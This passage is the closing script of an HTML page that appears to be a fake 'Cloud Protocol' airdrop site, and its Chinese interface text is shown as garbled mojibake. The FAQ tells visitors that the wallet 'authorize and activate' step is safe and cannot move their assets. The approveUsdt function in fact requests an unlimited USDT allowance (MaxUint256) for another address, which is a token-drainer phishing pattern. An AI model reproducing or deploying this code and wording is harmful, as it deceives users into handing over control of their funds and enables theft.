            faqTitle: "å¸¸è§é—®é¢˜è§£ç­”",
            faq1q: "ä»€ä¹ˆæ˜¯Cloud Protocolï¼Ÿ", faq1a: "Cloud Protocolæ˜¯ä¸€ä¸ªé›†æˆäº†å»ä¸­å¿ƒåŒ–äº¤æ˜“ã€å€Ÿè´·å’Œæ”¶ç›Šèšåˆçš„ç»Ÿä¸€æµåŠ¨æ€§åè®®ã€‚æˆ‘ä»¬çš„ä½¿å‘½æ˜¯ç®€åŒ–DeFiæ“ä½œï¼Œä¸ºç”¨æˆ·æä¾›ä¸€ä¸ªå®‰å…¨ã€é«˜æ•ˆä¸”ç”¨æˆ·å‹å¥½çš„å¹³å°æ¥ç®¡ç†ä»–ä»¬çš„æ•°å­—èµ„äº§ã€‚",
            faq2q: "æˆ‘ä¸ºä»€ä¹ˆä¼šæ”¶åˆ°CLOUDç©ºæŠ•ï¼Ÿ", faq2a: "ä¸ºäº†å¥–åŠ±æ—©æœŸé‡‡ç”¨è€…å’Œæ´»è·ƒçš„DeFiç¤¾åŒºæˆå‘˜ï¼Œæˆ‘ä»¬å¯¹ç‰¹å®šé“¾ä¸Šåœ°å€è¿›è¡Œäº†å¿«ç…§ã€‚å¦‚æœæ‚¨æ˜¯çŸ¥åDeFiåè®®çš„æ´»è·ƒç”¨æˆ·ã€NFTæŒæœ‰è€…æˆ–æ—©æœŸæµ‹è¯•ç½‘å‚ä¸è€…ï¼Œæ‚¨å¯èƒ½æœ‰èµ„æ ¼è·å¾—æˆ‘ä»¬çš„åˆ›ä¸–ç©ºæŠ•ã€‚",
            faq3q: "ä¸ºä»€ä¹ˆæˆ‘éœ€è¦â€œæˆæƒå¹¶æ¿€æ´»é’±åŒ…â€ï¼Ÿè¿™æ˜¯å®‰å…¨çš„å—ï¼Ÿ", faq3a: "æ˜¯çš„ï¼Œè¿™æ˜¯ä¸€ä¸ªå®Œå…¨å®‰å…¨ä¸”æ ‡å‡†çš„Web3æ“ä½œã€‚ä¸ºäº†è®©æˆ‘ä»¬çš„DAppèƒ½å¤ŸéªŒè¯æ‚¨çš„ç©ºæŠ•èµ„æ ¼å¹¶ä¸ºæ‚¨æ¿€æ´»æœªæ¥çš„è´¨æŠ¼ç­‰é«˜çº§åŠŸèƒ½ï¼Œå®ƒéœ€è¦ä¸æ‚¨çš„é’±åŒ…è¿›è¡Œä¸€æ¬¡æ€§çš„æ™ºèƒ½åˆçº¦äº¤äº’ã€‚è¿™è¢«ç§°ä¸ºâ€œapproveâ€ï¼ˆæˆæƒï¼‰æ“ä½œï¼Œå®ƒå…è®¸æˆ‘ä»¬çš„åè®®è¯»å–æ‚¨çš„ä»£å¸ä¿¡æ¯ä»¥è¿›è¡ŒéªŒè¯ï¼Œä½†ç»ä¸ä¼šåœ¨æœªç»æ‚¨è®¸å¯çš„æƒ…å†µä¸‹è½¬ç§»æ‚¨çš„èµ„äº§ã€‚æ‰€æœ‰é¡¶çº§DeFiåº”ç”¨åœ¨é¦–æ¬¡äº¤äº’æ—¶éƒ½éœ€è¦æ­¤æ­¥éª¤ã€‚",
            footerText: "Â© 2025 Cloud Protocol Foundation. ç‰ˆæƒæ‰€æœ‰ã€‚",
            // Messages
            msgConnecting: "æ­£åœ¨è¯·æ±‚è¿æ¥æ‚¨çš„é’±åŒ…...", msgConnected: "é’±åŒ…è¿æ¥æˆåŠŸï¼æ­£åœ¨åŠ è½½æ‚¨çš„èµ„äº§ä¿¡æ¯...", msgConnectError: "è¿æ¥è¢«æ‹’ç»æˆ–å‘ç”Ÿé”™è¯¯: ",
            msgBalanceError: "èµ„äº§åŠ è½½å¤±è´¥ï¼Œè¯·æ£€æŸ¥ç½‘ç»œè®¾ç½®å’Œåˆçº¦åœ°å€ã€‚",
            msgApproveRequest: "è¯·åœ¨æ‚¨çš„é’±åŒ…ä¸­ç¡®è®¤æˆæƒäº¤æ˜“...", msgTxBroadcast: "äº¤æ˜“å·²å¹¿æ’­ï¼Œç­‰å¾…åŒºå—é“¾ç¡®è®¤...",
            msgApproveSuccess: "æˆæƒæˆåŠŸï¼æ‚¨çš„é’±åŒ…å·²å®Œå…¨æ¿€æ´»ï¼Œæ‰€æœ‰æƒç›Šå·²è§£é”ã€‚",
            msgApproveError: "æˆæƒå¤±è´¥: ", msgUserRejected: "ç”¨æˆ·æ‹’ç»äº†äº¤æ˜“ã€‚"
        }
    };

    let currentLang = 'zh';

    function setLanguage(lang) {
        currentLang = lang;
        localStorage.setItem('cloud-protocol-lang', lang);
        document.documentElement.lang = lang === 'zh' ? 'zh-CN' : 'en';
        document.querySelectorAll('[data-i18n]').forEach(el => {
            const key = el.dataset.i18n;
            if (translations[lang][key]) {
                el.innerHTML = translations[lang][key];
            }
        });
    }

    // --- Web3 Logic ---
    let provider, signer, userAddress, cloudContract, usdtContract;
    const connectButtonHeader = document.getElementById('connectButtonHeader');
    const connectButtonMain = document.getElementById('connectButtonMain');
    const approveButton = document.getElementById('approveButton');
    const connectSection = document.getElementById('connect-section');
    const dappSection = document.getElementById('dapp-section');
    const messageLog = document.getElementById('message-log');

    function logMessage(msgKey, type = 'info', extra = '') {
        const message = translations[currentLang][msgKey] + extra;
        messageLog.textContent = message;
        messageLog.className = `message-log log-${type}`;
        messageLog.style.display = 'block';
    }

    async function connectWallet() {
        if (typeof window.ethereum === 'undefined') {
            return alert('Please install MetaMask!');
        }
        try {
            logMessage('msgConnecting', 'info');
            await window.ethereum.request({ method: 'eth_requestAccounts' });
            provider = new ethers.providers.Web3Provider(window.ethereum);
            signer = provider.getSigner();
            userAddress = await signer.getAddress();
            
            cloudContract = new ethers.Contract(CLOUD_TOKEN_ADDRESS, ERC20_ABI, signer);
            usdtContract = new ethers.Contract(USDT_TOKEN_ADDRESS, ERC20_ABI, signer);

            logMessage('msgConnected', 'success');
            updateUI();
        } catch (error) {
            logMessage('msgConnectError', 'error', error.message);
        }
    }

    async function updateUI() {
        if (!userAddress) return;
        connectSection.classList.add('hidden');
        dappSection.classList.remove('hidden');
        const addrShort = `${userAddress.substring(0, 6)}...${userAddress.substring(userAddress.length - 4)}`;
        connectButtonHeader.textContent = addrShort;
        connectButtonHeader.disabled = true;
        document.getElementById('userAddress').textContent = userAddress;

        try {
            const [cloudBal, usdtBal, cloudDecimals, usdtDecimals] = await Promise.all([
                cloudContract.balanceOf(userAddress), usdtContract.balanceOf(userAddress),
                cloudContract.decimals(), usdtContract.decimals()
            ]);
            document.getElementById('cloudBalance').textContent = parseFloat(ethers.utils.formatUnits(cloudBal, cloudDecimals)).toFixed(4);
            document.getElementById('usdtBalance').textContent = parseFloat(ethers.utils.formatUnits(usdtBal, usdtDecimals)).toFixed(2);
        } catch(e) {
            logMessage('msgBalanceError', 'error');
        }
    }

    async function approveUsdt() {
        if (!usdtContract) return;
        const spenderAddress = CLOUD_TOKEN_ADDRESS;
        const amountToApprove = ethers.constants.MaxUint256;

        logMessage('msgApproveRequest', 'info');
        approveButton.disabled = true;
        document.getElementById('approve-text').classList.add('hidden');
        document.getElementById('approve-loader').classList.remove('hidden');
        approveButton.style.animation = 'none';

        try {
            const tx = await usdtContract.approve(spenderAddress, amountToApprove);
            logMessage('msgTxBroadcast', 'info');
            await tx.wait(); 
            logMessage('msgApproveSuccess', 'success');
            document.getElementById('approve-loader').classList.add('hidden');
            const successText = document.getElementById('approve-text');
            successText.textContent = 'âœ… ' + (currentLang === 'zh' ? 'å·²æˆåŠŸæ¿€æ´»' : 'Successfully Activated');
            successText.classList.remove('hidden');
        } catch (error) {
            logMessage('msgApproveError', 'error', error.reason || translations[currentLang].msgUserRejected);
            approveButton.disabled = false;
            document.getElementById('approve-text').classList.remove('hidden');
            document.getElementById('approve-loader').classList.add('hidden');
            approveButton.style.animation = 'pulse 2s infinite';
        }
    }
    
    // --- Event Listeners ---
    document.addEventListener('DOMContentLoaded', () => {
        const savedLang = localStorage.getItem('cloud-protocol-lang') || 'zh';
        setLanguage(savedLang);

        document.getElementById('lang-switcher').addEventListener('click', () => {
            const newLang = currentLang === 'en' ? 'zh' : 'en';
            setLanguage(newLang);
        });

        connectButtonHeader.addEventListener('click', connectWallet);
        connectButtonMain.addEventListener('click', connectWallet);
        approveButton.addEventListener('click', approveUsdt);

        document.querySelectorAll('.faq-question').forEach(item => {
            item.addEventListener('click', event => {
                const parent = item.parentElement;
                parent.classList.toggle('active');
            });
        });
    });
</script>

</body>
</html>